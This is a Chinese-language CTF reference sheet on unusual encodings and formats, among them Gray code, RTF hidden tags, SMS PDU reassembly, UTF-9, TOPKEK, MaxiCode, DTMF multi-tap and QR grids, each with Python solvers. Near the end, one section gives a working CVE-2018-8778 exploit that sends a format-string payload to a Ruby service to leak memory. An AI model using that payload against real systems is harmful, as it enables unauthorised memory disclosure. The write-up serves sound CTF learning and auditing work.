# CTF Misc - 高级编码与专用格式

## 目录
- [Verilog/HDL](#veriloghdl)
- [Gray Code Cyclic Encoding (EHAX 2026)](#gray-code-cyclic-encoding-ehax-2026)
- [Binary Tree Key Encoding](#binary-tree-key-encoding)
- [RTF Custom Tag Data Extraction (VolgaCTF 2013)](#rtf-custom-tag-data-extraction-volgactf-2013)
- [SMS PDU Decoding and Reassembly (RuCTF 2013)](#sms-pdu-decoding-and-reassembly-ructf-2013)
- [Automated Multi-Encoding Sequential Solver (HackIM 2016)](#automated-multi-encoding-sequential-solver-hackim-2016)
- [RFC 4042 UTF-9 Decoding (SECCON 2015)](#rfc-4042-utf-9-decoding-seccon-2015)
- [Pixel Color Binary Encoding (Break In 2016)](#pixel-color-binary-encoding-break-in-2016)
- [Hexadecimal Sudoku + QR Assembly (BSidesSF 2026)](#hexadecimal-sudoku--qr-assembly-bsidessf-2026)
- [TOPKEK Binary Encoding (Hack The Vote 2016)](#topkek-binary-encoding-hack-the-vote-2016)
- [MaxiCode 2D Barcode Decoding (CSAW CTF 2016)](#maxicode-2d-barcode-decoding-csaw-ctf-2016)
- [DTMF Audio with Multi-Tap Phone Keypad Decoding (h4ckc0n 2017)](#dtmf-audio-with-multi-tap-phone-keypad-decoding-h4ckc0n-2017)
- [Music Note Interval Steganography (DefCamp 2017)](#music-note-interval-steganography-defcamp-2017)
- [Ruby Array#unpack Buffer Under-Read CVE-2018-8778 (Codegate 2019)](#ruby-arrayunpack-buffer-under-read-cve-2018-8778-codegate-2019)
- [Binary Grid Text to QR Image + XOR Key (Pragyan CTF 2019)](#binary-grid-text-to-qr-image--xor-key-pragyan-ctf-2019)

---

## Verilog/HDL

```python
# 将 Verilog 逻辑转换为 Python
def verilog_module(input_byte):
    wire_a = (input_byte >> 4) & 0xF
    wire_b = input_byte & 0xF
    return wire_a ^ wire_b
```

---

## Gray Code Cyclic Encoding (EHAX 2026)

**模式 (#808080)：** Web 界面带有一个圆形轮盘（5 个同心圆 = 5 位，32 个位置）。必须填写一个有效的 Gray 码序列，其中相邻值恰好相差一位。

**Gray 码性质：**
- N 位 Gray 码有 2^N 个唯一值
- 相邻值恰好相差 1 位（汉明距离 = 1）
- 序列是**循环的** — 旋转起始位置会产生另一个有效序列
- 标准转换：`gray = n ^ (n >> 1)`

```python
# 生成 N 位 Gray 码序列
def gray_code(n_bits):
    return [i ^ (i >> 1) for i in range(1 << n_bits)]

# 5 位 Gray 码：32 个值
seq = gray_code(5)
# [0, 1, 3, 2, 6, 7, 5, 4, 12, 13, 15, 14, 10, 11, 9, 8, ...]

# 通过 k 位旋转序列（循环性质）
def rotate(seq, k):
    return seq[k:] + seq[:k]

# 如果解码输出是 ROT-N 偏移，旋转 Gray 码起始位置 N 位
rotated = rotate(seq, 4)  # 起始位置向后移 4 位
```

**关键洞察：** 如果解码输出看起来正确但有偏移（例如 ROT-4），则需要将 Gray 码起始位置循环旋转相同的偏移量。循环性质保证所有旋转仍是有效的 Gray 码。

**轮盘映射：** 每个同心圆对应一位。最内层 = 位 0，最外层 = 位 N-1。读取每个角度位置的位以构建 N 位值。

---

## Binary Tree Key Encoding

**编码规则：** `'0' → j = j*2 + 1`，`'1' → j = j*2 + 2`

**解码代码：**
```python
def decode_path(index):
    path = ""
    while index != 0:
        if index & 1:  # 奇数 = 左子树 ('0')
            path += "0"
            index = (index - 1) // 2
        else:          # 偶数 = 右子树 ('1')
            path += "1"
            index = (index - 2) // 2
    return path[::-1]
```

---

## RTF Custom Tag Data Extraction (VolgaCTF 2013)

**模式：** 数据隐藏在自定义 RTF 控制序列中（例如 `{\*\volgactf412 [DATA]}`）。提取编号块，按索引排序，拼接后进行 base64 解码。

```python
import re, base64

rtf = open('document.rtf', 'r').read()
# 提取自定义标签：{\*\volgactf<N> <DATA>}
blocks = re.findall(r'\{\\\*\\volgactf(\d+)\s+([^}]+)\}', rtf)
blocks.sort(key=lambda x: int(x[0]))  # 按数字索引排序
payload = ''.join(data for _, data in blocks)
flag = base64.b64decode(payload)
```

**关键洞察：** RTF 文件支持以 `\*` 前缀的自定义控制序列（可忽略的目的地）。恶意或挑战数据隐藏在这些被忽略的字段中 — 标准 RTF 查看器会跳过它们。可用 `grep -oP '\\\\\\*\\\\[a-z]+\d*' document.rtf` 查找非标准的 `\*\` 标签。

---
## SMS PDU 解码与重组（RuCTF 2013）

**模式：** 拦截的十六进制字符串是 GSM SMS-SUBMIT PDU（协议数据单元）帧。拼接的短信需要通过序列号对 UDH（用户数据头）进行重组。

```python
from smspdu import SMS_SUBMIT

# 读取 PDU 十六进制字符串（每行一个）
pdus = [line.strip() for line in open('sms_intercept.txt')]

# 按拼接序列号排序（十六进制的第 38-40 字节）
pdus.sort(key=lambda pdu: int(pdu[38:40], 16))

# 提取并拼接用户数据
payload = b''
for pdu in pdus:
    sms = SMS_SUBMIT.fromPDU(pdu[2:], '')  # 跳过第一个字节（SMSC 长度）
    payload += sms.user_data.encode() if isinstance(sms.user_data, str) else sms.user_data

# 载荷通常是 base64 编码 — 解码以获取嵌入文件
import base64
with open('output.png', 'wb') as f:
    f.write(base64.b64decode(payload))
```

**关键点：** SMS PDU 格式：`0041000B91` 前缀标识 SMS-SUBMIT。UDH 字段位于第 29-40 字节，包含 `05000301XXYY`，其中 XX=总分片数，YY=序列号。安装 `smspdu` 库（`pip install smspdu`）以实现自动解析。输出通常是 base64 编码的图片 — 可用反向图片搜索识别内容。

---

## 自动多编码顺序解码器（HackIM 2016）

有些挑战需要解码 25 层以上不同编码的连续嵌套。构建自动解码器：

```python
import base64, zlib, bz2, codecs

def auto_decode(data):
    """尝试每种编码并返回第一个成功解码结果"""
    decoders = [
        ('base64', lambda d: base64.b64decode(d)),
        ('base32', lambda d: base64.b32decode(d)),
        ('base16', lambda d: base64.b16decode(d.upper())),
        ('zlib',   lambda d: zlib.decompress(d if isinstance(d, bytes) else d.encode())),
        ('bz2',    lambda d: bz2.decompress(d if isinstance(d, bytes) else d.encode())),
        ('rot13',  lambda d: codecs.decode(d, 'rot_13')),
        ('hex',    lambda d: bytes.fromhex(d if isinstance(d, str) else d.decode())),
        ('binary', lambda d: bytes(int(d[i:i+8], 2) for i in range(0, len(d.strip()), 8))),
        ('ebcdic', lambda d: d.decode('cp500') if isinstance(d, bytes) else d.encode().decode('cp500')),
    ]

    for name, decoder in decoders:
        try:
            result = decoder(data)
            if result and len(result) > 0:
                return name, result
        except:
            continue
    return None, data

# 链式解码
data = initial_input
for i in range(50):  # 最大层数
    name, data = auto_decode(data)
    if name is None:
        break
    print(f"Layer {i}: {name}")
```

根据需要添加 Brainfuck 检测（仅包含 `+-<>[].,` 字符）及其他冷门语言。

---

## RFC 4042 UTF-9 解码（SECCON 2015）

RFC 4042（愚人节 RFC）定义了 UTF-9，一种用于 9 位字节系统的 9 位 Unicode 编码：

- 每个 9 位“字节”有一个续延位（最高位）：1 = 后续还有字节，0 = 最后一个字节
- 低 8 位包含字符数据
- 多字节序列将 8 位部分拼接起来

```python
def decode_utf9(data_bits):
    """从位串解码 UTF-9"""
    chars = []
    i = 0
    while i < len(data_bits):
        # 读取 9 位单元直到续延位为 0
        codepoint_bits = ''
        while i + 9 <= len(data_bits):
            continuation = int(data_bits[i])
            codepoint_bits += data_bits[i+1:i+9]
            i += 9
            if continuation == 0:
                break
        if codepoint_bits:
            chars.append(chr(int(codepoint_bits, 2)))
    return ''.join(chars)

# 先将八进制/十六进制输入转换为二进制
binary_string = bin(int(octal_data, 8))[2:]
result = decode_utf9(binary_string)
```

**关键点：** 在挑战描述中寻找 “4042” 或 “UTF-9”。愚人节 RFC 系列（RFC 1149、2549、4042）偶尔会出现在 CTF 中。

---
## Pixel Color Binary Encoding（2016年破解）

窄幅图像（宽度7-8像素）可能将ASCII字符编码为二进制像素行：

```python
from PIL import Image

img = Image.open('challenge.png')
pixels = img.load()
width, height = img.size

text = ''
for y in range(height):
    bits = ''
    for x in range(width):
        r, g, b = pixels[x, y][:3]
        # 红色像素 = 1，黑色像素 = 0（或白色=1，黑色=0）
        bits += '1' if r > 128 else '0'

    # 如有需要，补齐到8位（7像素宽的图像）
    if len(bits) == 7:
        bits = '0' + bits  # 在前面补零

    text += chr(int(bits, 2))

print(text)
```

**关键洞察：** 图像宽度为7或8像素强烈暗示二进制字符编码（7位ASCII或8位）。检查颜色通道和亮度阈值。

---

### 十六进制数独 + QR 组装（BSidesSF 2026）

**模式（hexhaustion）：** Flag分布在4个QR码中，每个QR码包含16x16十六进制数独网格的一个象限。解数独，读取主对角线的值作为十六进制对，转换为ASCII即为flag。

**解题步骤：**

1. **扫描QR码：** 使用`zbarimg`或`pyzbar`解码所有4个QR码
2. **组装网格：** 每个QR包含一个8x8象限，内含十六进制值（0-F）和空白
3. **解16x16数独：** 使用标准数独规则，数字为0-F——每行、每列和每个4x4宫格内数字各不相同
4. **提取flag：** 读取对角线值`grid[i][i]`，i=0..15，配对成字节，解码为ASCII

```python
from itertools import product

def solve_hex_sudoku(grid):
    """使用回溯法解16x16十六进制数独，数字范围0-F。"""
    digits = set(range(16))

    def possible(r, c):
        used = set()
        used.update(grid[r])              # 行
        used.update(grid[i][c] for i in range(16))  # 列
        br, bc = (r // 4) * 4, (c // 4) * 4  # 4x4宫格
        for i, j in product(range(br, br+4), range(bc, bc+4)):
            used.update({grid[i][j]})
        used.discard(-1)  # -1表示空白
        return digits - used

    def solve():
        for r, c in product(range(16), range(16)):
            if grid[r][c] == -1:
                for d in possible(r, c):
                    grid[r][c] = d
                    if solve():
                        return True
                    grid[r][c] = -1
                return False
        return True

    solve()
    return grid

# 读取对角线并转换为ASCII
solved = solve_hex_sudoku(grid)
diag_hex = ''.join(format(solved[i][i], 'X') for i in range(16))
flag = bytes.fromhex(diag_hex).decode('ascii')
print(flag)  # 例如 "HYPOAXIS"
```

**关键洞察：** QR码既是分发机制（将谜题拆分成4部分），也是数据编码层。实际flag编码在数独解的对角线值中，按十六进制字节解释。

**识别时机：** 挑战分发多个QR码，提及“hex”、“nibbles”或“16x16网格”。QR内容包含带空白/下划线的十六进制字符。

**参考：** BSidesSF 2026 “hexhaustion”

---

### TOPKEK 二进制编码（Hack The Vote 2016）

自定义二进制编码，`KEK`表示位0，`TOP`表示位1。感叹号表示位重复次数。

```python
def decode_topkek(encoded):
    """解码TOPKEK编码：KEK=0，TOP=1，!表示重复次数"""
    tokens = encoded.split()
    bits = ""

    for token in tokens:
        # 计算感叹号数量（重复次数 = 长度 - 3）
        base = token.replace('!', '')
        repeats = len(token) - len(base)
        if repeats == 0:
            repeats = 1

        if base == "KEK":
            bits += "0" * repeats
        elif base == "TOP":
            bits += "1" * repeats

    # 将二进制字符串转换为ASCII
    message = ""
    for i in range(0, len(bits), 8):
        byte = bits[i:i+8]
        if len(byte) == 8:
            message += chr(int(byte, 2))

    return message

# 示例："KEK! TOP!! KEK TOP!"
# = "0" + "11" + "0" + "1" = "0110 1..."
```

**关键洞察：** TOPKEK是CTF特有编码。通过`TOP`/`KEK`单词及不同数量的`!`后缀识别。每个`!`增加对应位的重复次数。解码为二进制，再按8位分组转ASCII。

---
### MaxiCode 2D 条码解码（CSAW CTF 2016）

MaxiCode 是 UPS 使用的一种六边形二维条码，偶尔会出现在 CTF 取证挑战中。

```bash
# 识别 MaxiCode：独特的靶心中心图案
# 伴随六边形点阵（不同于 QR 码的方形模块）

# 使用 zxing 库解码：
# 在线：https://zxing.org/w/decode.jspx （上传图片）

# Python:
# pip install zxing pyzbar
python3 -c "
from pyzbar.pyzbar import decode
from PIL import Image
results = decode(Image.open('maxicode.gif'), symbols=[pyzbar.ZBarSymbol.CODE128])
# 注意：pyzbar 可能不直接支持 MaxiCode
# 建议使用 zxing Java 库：
"

# Java zxing 命令行：
java -cp javase.jar:core.jar com.google.zxing.client.j2se.CommandLineRunner maxicode.gif

# 备选：使用在线解码器
# - https://products.aspose.app/barcode/recognize
# - https://www.onlinebarcodereader.com/
```

**关键点：** MaxiCode 有独特的靶心中心（3 个同心圆），周围是六边形网格。标准的 QR 解码器无法读取它。使用原生支持 MaxiCode 的 zxing（Java）或在线条码解码器。MaxiCode 常见于运输标签、CTF 取证磁盘镜像及嵌入其他文件中。

---

### DTMF 音频与多击手机键盘解码（h4ckc0n 2017）

**模式：** 音频文件包含 DTMF 电话键盘音调。这是两层编码：先将音调解码为数字序列，再将分组数字解码为多击手机键盘输入（重复按键选择字母）。

**步骤 1 — 将 DTMF 音调解码为数字：** 使用 Audacity 的频谱图视图或在线 DTMF 解码器识别音调对。暂停/间隔表示单词或分组边界。

**步骤 2 — 解码多击键盘：** 按按键序列分组数字，然后映射为字母：

```python
# 多击解码映射
T9 = {
    '2':'a',  '22':'b',  '222':'c',
    '3':'d',  '33':'e',  '333':'f',
    '4':'g',  '44':'h',  '444':'i',
    '5':'j',  '55':'k',  '555':'l',
    '6':'m',  '66':'n',  '666':'o',
    '7':'p',  '77':'q',  '777':'r', '7777':'s',
    '8':'t',  '88':'u',  '888':'v',
    '9':'w',  '99':'x',  '999':'y', '9999':'z',
}

def decode_multitap(groups):
    """groups: 类似 ['444', '88', '2', ...] 的字符串列表"""
    return ''.join(T9.get(g, '?') for g in groups)
```

**关键点：** 两层编码——DTMF 音调编码数字，数字序列使用多击手机键盘映射。用 Audacity 频谱图识别暂停位置作为分组边界。同一数字的连续按键映射为一个字母；暂停分隔同一数字键的不同按键。

---

### 音符间隔隐写术（DefCamp 2017）

**模式：** 一个 MP3 被转录为音乐音符。flag 以音符对编码，每个音符根据其在 D 大调音阶中的位置（音阶度数）映射为半字节（4 位）。两个半字节合成一个字节/字符。

**编码方案：**
- D 大调音阶度数 0–7 映射为半字节值 0–7（3 位半字节）或 0–15（4 位半字节），视变体而定
- 每对连续音符编码一个字符：`(note1 << 4) | note2`
- 已知 flag 前缀/后缀（如 `CTF{...}`）在开头/结尾揭示字母表映射

**恢复方法：**

```python
# 示例：D 大调音阶度数 → 半字节值
# D=0, E=1, F#=2, G=3, A=4, B=5, C#=6, D(高八度)=7
scale = {'D': 0, 'E': 1, 'F#': 2, 'G': 3, 'A': 4, 'B': 5, 'C#': 6}

notes = ['A', 'D', 'G', 'E', ...]  # 从音频转录的音符

chars = []
for i in range(0, len(notes) - 1, 2):
    hi = scale[notes[i]]
    lo = scale[notes[i+1]]
    chars.append(chr((hi << 4) | lo))

print(''.join(chars))
```

**关键点：** 已知明文（如 `CTF{` 和 `}`）在开头和结尾揭示编码字母表——将已知字符映射回对应音符对以确认音阶度数分配。音乐音阶度数即半字节值；音符对合成一个字节。

---
## Ruby Array#unpack 缓冲区越界读取 CVE-2018-8778（Codegate 2019）

**模式：** 一个 Ruby 服务调用 `String#unpack`（或 `Array#pack`）时，格式字符串由攻击者控制。在 Ruby 2.5.1 之前的版本中，超大 `@N` 偏移量与有符号整数比较，因此巨大的 N 会绕回为负指针偏移——`unpack` 随后从字符串缓冲区*之前*的内存读取字节，并将其作为整数输出。结合将用户输入放入格式字符串的常见漏洞（例如 `input.unpack("C*#{input}.length")`），就能获得任意内存泄露原语。

```python
# 远程 Ruby 服务器执行：input.unpack("C*#{input}.length")
# 输入 "@HUGECHUNK1200000" 构造格式字符串 "C*@HUGECHUNK1200000.length"
# unpack 解析为：@<offset> C<count> -> 从远偏移读取 <count> 字节。
import socket
payload = b'@18446744073708351616C1200000\n1\n'   # 2**64 - 0x1C0000
s = socket.create_connection(('target', 12137))
s.sendall(payload)
data = b''
while True:
    chunk = s.recv(4096)
    if not chunk:
        break
    data += chunk

# 每行输出一个整数（泄露内存中的字节值）
import string
out = ''.join(
    chr(int(line)) for line in data.decode(errors='ignore').splitlines()
    if line.strip().isdigit() and chr(int(line)) in string.printable
)
import re
print(re.findall(r'FLAG\{[^}]*\}', out))
```

**关键洞察：** `String#unpack` 本身并不不安全——当且仅当 (a) 格式字符串由攻击者控制（格式注入模式，相当于 `printf` 漏洞），且 (b) Ruby 运行时版本低于 2.5.1（CVE-2018-8778）时，超大 `@N` 偏移会泄露任意内存。务必审计所有将用户输入插入 `pack`/`unpack`/`sprintf` 模板的 Ruby 服务。

**参考资料：** Codegate CTF 2019 预赛 — mini converter，writeup 13209

---

## 二进制网格文本转 QR 图像 + XOR 密钥（Pragyan CTF 2019）

**模式：** 一个文本文件仅包含 `0` 和 `1` 字符（通常每行一个，或带随机换行）。去除空白，验证长度为完全平方数（或已知宽高 W*H），渲染为像素网格，用 `pyzbar` 解码。QR 负载是十六进制编码，需用重复密钥（通常是 `flag` 或挑战名）XOR 解密才能得到 flag。

```python
from PIL import Image, ImageDraw
from pyzbar.pyzbar import decode

raw = open('01qr').read()
bits = ''.join(c for c in raw if c in '01')
# 猜测尺寸
import math
n = int(math.isqrt(len(bits)))
assert n * n == len(bits), f'not square: {len(bits)}'

scale = 5
img = Image.new('RGB', (n * scale, n * scale), (255, 255, 255))
d = ImageDraw.Draw(img)
for i in range(n):
    for j in range(n):
        if bits[i * n + j] == '0':           # 本题中 0 表示黑色
            d.rectangle((j*scale, i*scale,
                         j*scale + scale, i*scale + scale), fill=(0, 0, 0))
img.save('qr.png')

hexstr = decode(img)[0].data.decode()
ct = bytes.fromhex(hexstr)
key = b'flag'
pt = bytes(b ^ key[i % len(key)] for i, b in enumerate(ct))
print(pt)
```

**关键洞察：** 二进制网格文本文件常见为“渲染我”类谜题——每个位对应一个像素，放大 4-8 倍以便 `zbarimg`/`pyzbar` 识别定位图案。如果解码字节可打印但无意义（如 `9YQ8S_VY^`），尝试用短重复密钥 XOR，密钥可能是 `flag`、CTF 名称或 `ctf{`——用 `pctf{` XOR 密文前 5 字节即可立即恢复密钥。

**参考资料：** Pragyan CTF 2019 — EXORcism，writeup 13835
